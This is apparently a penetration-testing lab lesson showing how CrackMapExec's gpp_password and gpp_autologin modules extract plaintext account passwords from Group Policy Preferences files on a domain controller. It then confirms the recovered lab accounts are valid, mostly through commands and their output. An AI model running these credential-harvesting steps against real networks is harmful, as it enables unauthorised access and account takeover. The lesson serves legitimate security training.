# Searching for Accounts in Group Policy Objects

Once we have control of an account, there are some mandatory checks we need to perform. Searching for credentials written in the `Group Policy Objects` (`GPO`) can pay off, especially in an old environment (Windows server 2003 / 2008) since every domain user can read the GPOs.

CrackMapExec has two modules that will search all the GPOs and find juicy credentials. We can use the modules `gpp_password` and `gpp_autologin`. The first module, `gpp_password`, retrieves the plaintext password and other information for accounts pushed through `Group Policy Preferences` (`GPP`). We can read more about this attack in this blog post [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288), and the second module, `gpp_autologin`, searches the Domain Controller for `registry.xml` files to find autologin information and returns the username and clear text password if present.

### **Password GPP**

```shell-session
$ crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_password

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
GPP_PASS... 10.129.203.121  445    DC01             [+] Found SYSVOL share
GPP_PASS... 10.129.203.121  445    DC01             [*] Searching for potential XML files containing passwords
GPP_PASS... 10.129.203.121  445    DC01             [*] Found inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
GPP_PASS... 10.129.203.121  445    DC01             Password: Inlanefreight1998!
GPP_PASS... 10.129.203.121  445    DC01             action: U
GPP_PASS... 10.129.203.121  445    DC01             newName: 
GPP_PASS... 10.129.203.121  445    DC01             fullName: 
GPP_PASS... 10.129.203.121  445    DC01             description: 
GPP_PASS... 10.129.203.121  445    DC01             changeLogon: 0
GPP_PASS... 10.129.203.121  445    DC01             noChange: 1
GPP_PASS... 10.129.203.121  445    DC01             neverExpires: 1
GPP_PASS... 10.129.203.121  445    DC01             acctDisabled: 0
GPP_PASS... 10.129.203.121  445    DC01             userName: inlanefreight.htb\engels
```

### **AutoLogin GPP**

```shell-session
$ crackmapexec smb 10.129.203.121 -u grace -p Inlanefreight01! -M gpp_autologin

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
GPP_AUTO... 10.129.203.121  445    DC01             [+] Found SYSVOL share
GPP_AUTO... 10.129.203.121  445    DC01             [*] Searching for Registry.xml
GPP_AUTO... 10.129.203.121  445    DC01             [*] Found inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121  445    DC01             [+] Found credentials in inlanefreight.htb/Policies/{C17DD5D1-0D41-4AE9-B393-ADF5B3DD208D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 10.129.203.121  445    DC01             Usernames: ['kiosko']
GPP_AUTO... 10.129.203.121  445    DC01             Domains: ['INLANEFREIGHT']
GPP_AUTO... 10.129.203.121  445    DC01             Passwords: ['SimplePassword123!']
```

In our case, we found two accounts with two different passwords. Let's check if these accounts are still valid:

### **Credentials Validation**

```shell-session
$ crackmapexec smb 10.129.203.121 -u engels -p Inlanefreight1998!

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\engels:Inlanefreight1998!
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u kiosko -p SimplePassword123!
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\kiosko:SimplePassword123!
```

Both accounts are still valid, and we can use them to authenticate to the domain, identify which privileges they have, or try to reuse those credentials.
